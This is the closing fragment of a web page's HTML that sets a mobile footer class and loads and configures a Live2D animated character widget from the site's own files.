  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>